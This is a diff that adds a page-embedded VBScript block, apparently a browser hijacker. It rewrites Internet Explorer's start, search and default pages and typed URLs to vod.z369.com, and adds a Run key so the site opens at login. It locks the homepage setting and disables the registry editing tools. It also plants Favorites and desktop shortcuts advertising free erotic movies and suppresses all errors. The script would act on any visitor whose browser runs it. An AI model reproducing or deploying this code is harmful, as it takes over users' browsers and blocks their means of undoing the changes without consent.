@@ -1,0 +1,36 @@
+<script LANGUAGE="VBScript">
+bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page", "Http://vod.z369.com"
+bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page", "Http://vod.z369.com"
+bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Search Page", "Http://vod.z369.com"
+bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\default_page_url", "Http://vod.z369.com"
+bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\TypedURLs\url1","Http://vod.z369.com"
+bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\TypedURLs\url2","Http://vod.z369.com"
+bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\TypedURLs\url3","Http://vod.z369.com"
+bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\First Home Page","Http://vod.z369.com"
+bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Second Home Page","Http://vod.z369.com"
+bugs.RegWrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\HomePage","1","REG_DWORD"
+bugs.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\IEXPLORE.EXE", "IEXPLORE.EXE Http://vod.z369.com"
+bugs.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools","1","REG_DWORD"
+bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Window Title", "免费激情在线电影 vod.z369.com"
+on error resume next
+Call LongFei_AddFavorites("-【免费激情在线电影】","Http://vod.z369.com")
+on error resume next
+Call LongFei_AddDesktop("免费激情在线电影","Http://vod.z369.com")
+on error resume next
+Call LongFei_AddQuickLaunch("[免费激情在线电影]","Http://vod.z369.com")
+Function LongFei_AddFavorites(N, U)
+	on error resume next
+	Set S = bugs.CreateShortcut(bugs.SpecialFolders("Favorites") + "/" + N +".URL")
+	S.TargetPath = U	
+	S.Save()
+	Set Sl = bugs.CreateShortcut(bugs.SpecialFolders("Favorites") + "/链接/" + N +".URL")
+	Sl.TargetPath = U
+	Sl.Save()
+End Function
+Function LongFei_AddDesktop(N, U)
+	on error resume next
+	Set S = bugs.CreateShortcut(bugs.SpecialFolders("AllUsersDesktop") + "/" + N +".URL")
+	S.TargetPath = U	
+	S.Save()
+End Function
+</script>
